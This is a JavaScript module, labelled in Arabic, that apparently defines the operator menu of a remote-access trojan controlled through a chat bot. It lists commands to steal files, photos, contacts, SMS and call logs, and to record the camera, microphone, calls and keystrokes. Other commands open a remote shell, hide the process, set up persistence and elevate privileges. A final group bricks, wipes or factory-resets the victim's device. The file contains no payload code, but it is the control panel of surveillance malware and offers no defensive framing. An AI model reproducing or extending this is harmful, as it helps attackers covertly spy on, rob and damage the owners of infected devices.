const SECTIONS = {
    '🔍 استطلاع': {
        '🔍 بصمة النظام':      'sysinfo',
        '📋 العمليات':         'processes',
        '🌐 الشبكة':           'netinfo',
        '📶 WiFi':             'wifi',
        '🔋 البطارية':         'battery',
        '📦 التطبيقات':        'installed',
        '🕐 وقت التشغيل':      'uptime',
        '📍 الموقع':           'location',
        '📱 معلومات الجهاز':   'deviceinfo'
    },
    '📂 ملفات': {
        '📂 مدير الملفات':     'filelist',
        '⬇️ تنزيل ملف':        'filedown',
        '⬆️ رفع ملف':          'fileup',
        '🗑️ حذف ملف':          'filedel',
        '🔎 بحث ملف':          'filesearch',
        '📝 قراءة ملف':        'fileread',
        '✏️ كتابة ملف':        'filewrite',
        '📁 سحب كل الملفات':   'filedump'
    },
    '🎬 وسائط': {
        '🖼️ سحب كل الصور':     'gallery_dump',
        '🎬 سحب كل الفيديوهات':'video_dump',
        '📥 تنزيل صورة':       'image_down',
        '📥 تنزيل فيديو':      'video_down',
        '📸 لقطة شاشة':        'screenshot',
        '📷 كاميرا أمامية':    'cam_front',
        '📷 كاميرا خلفية':     'cam_back',
        '🎥 تسجيل فيديو':      'video_record',
        '🎤 تسجيل صوت':        'record',
        '🎙️ تسجيل مكالمة':     'call_record',
        '🎵 سحب الصوتيات':     'audio_dump'
    },
    '📇 بيانات شخصية': {
        '📇 جهات الاتصال':     'contacts',
        '📛 سحب الأسماء':      'names',
        '📞 سحب المكالمات':    'calls',
        '💬 سحب الرسائل':      'sms_list',
        '📤 تصدير الرسائل':    'sms_export',
        '📨 إرسال SMS':        'sendSms',
        '📨 SMS للجميع':       'sendSmsAll',
        '💬 نص للجميع':        'textToAllContacts',
        '📋 الحافظة':          'clipboard',
        '📅 التقويم':          'calendar',
        '🔖 المفضلة':          'bookmarks'
    },
    '💻 تنفيذ': {
        '💻 Remote Shell':     'shell',
        '⚡ أمر سريع':         'runcmd',
        '📜 سكربت PS1':        'ps1',
        '🐍 سكربت Python':     'pyscript',
        '📦 تثبيت APK':        'install_apk',
        '▶️ تشغيل تطبيق':      'launch_app',
        '⏹️ إيقاف تطبيق':      'stop_app',
        '🔗 فتح رابط':         'openurl'
    },
    '🔒 استمرارية': {
        '🔒 تثبيت الاستمرارية':'persist',
        '🧹 إزالة الاستمرارية':'unpersist',
        '🔼 رفع الصلاحيات':    'elevate',
        '🫥 إخفاء العملية':    'hide',
        '🎭 تمويه الاسم':      'masquerade',
        '🔁 إعادة تشغيل':      'restart',
        '❌ إنهاء الجلسة':     'kill'
    },
    '⌨️ مراقبة': {
        '⌨️ Keylogger تشغيل': 'keylog_on',
        '⌨️ Keylogger إيقاف': 'keylog_off',
        '📋 تسليم الضغطات':    'keylog_dump',
        '🎥 بث الشاشة':        'screenstream',
        '👁️ مراقبة النشاط':   'activity_monitor',
        '🔔 إشعار':            'toast',
        '📳 ذبذبة':            'vibrate'
    },
    '💥 تدمير': {
        '🔒 قفل الشاشة':       'lock_screen',
        '📵 قطع الشبكة':       'net_kill',
        '💥 تعطيل الجهاز':     'brick',
        '🗑️ مسح البيانات':     'wipe_data',
        '🔥 إعادة ضبط مصنع':   'factory_reset',
        '⚠️ مسح بطاقة SD':     'wipe_sd',
        '🚫 حذف التطبيقات':    'uninstall_all',
        '🔊 رفع الصوت للأقصى': 'max_volume',
        '📢 رسالة ملء الشاشة': 'fullscreen_msg'
    },
    '🎛️ تحكم': {
        '🔄 تبديل جهاز':       'switch',
        '📡 إرسال للكل':       'broadcast',
        '📊 سجل الأوامر':      'logs',
        '⚙️ إعدادات Beacon':  'settings',
        '💾 تصدير البيانات':   'export',
        'ℹ️ عن البوت':         'about'
    }
};

const INPUT_PROMPTS = {
    'filedown':   'أدخل مسار الملف',
    'fileup':     'أدخل مسار الملف للرفع',
    'filedel':    'أدخل مسار الملف للحذف',
    'filesearch': 'أدخل اسم الملف',
    'fileread':   'أدخل مسار الملف',
    'filewrite':  'أدخل المسار ثم المحتوى (سطر جديد)',
    'image_down': 'أدخل مسار الصورة',
    'video_down': 'أدخل مسار الفيديو',
    'video_record': 'أدخل مدة التسجيل (ثانية)',
    'record':     'أدخل مدة التسجيل (ثانية)',
    'call_record':'أدخل مدة التسجيل (ثانية)',
    'sendSms':    'أدخل الرقم ثم النص (سطر جديد)',
    'sendSmsAll': 'أدخل نص الرسالة',
    'textToAllContacts': 'أدخل النص',
    'toast':      'أدخل نص الإشعار',
    'vibrate':    'أدخل المدة (ms)',
    'openurl':    'أدخل الرابط',
    'runcmd':     'أدخل الأمر',
    'shell':      'أدخل الأمر',
    'install_apk':'أدخل مسار APK',
    'launch_app': 'أدخل اسم الحزمة',
    'stop_app':   'أدخل اسم الحزمة',
    'settings':   'أدخل interval/jitter',
    'fullscreen_msg': 'أدخل نص الرسالة',
    'max_volume': 'أدخل مستوى الصوت (0-100)'
};

function buildMainKeyboard() {
    return {
        keyboard: [
            ['🔍 استطلاع',      '📂 ملفات'],
            ['🎬 وسائط',        '📇 بيانات شخصية'],
            ['💻 تنفيذ',        '🔒 استمرارية'],
            ['⌨️ مراقبة',       '💥 تدمير'],
            ['🎛️ تحكم',         '⌖ الأجهزة المتصلة'],
            ['⌖ التحكم',        '⌖ عن لنا']
        ],
        resize_keyboard: true
    };
}

function buildSectionKeyboard(sectionName) {
    const sec = SECTIONS[sectionName];
    if (!sec) return null;
    const keys = Object.keys(sec);
    const rows = [];
    for (let i = 0; i < keys.length; i += 2) rows.push(keys.slice(i, i + 2));
    rows.push(['🔙 رجوع']);
    return { keyboard: rows, resize_keyboard: true, one_time_keyboard: true };
}

function findCommand(text) {
    for (const sec of Object.values(SECTIONS)) {
        if (sec[text]) return sec[text];
    }
    return null;
}

module.exports = {
    SECTIONS,
    buildMainKeyboard,
    buildSectionKeyboard,
    findCommand,
    INPUT_PROMPTS
};
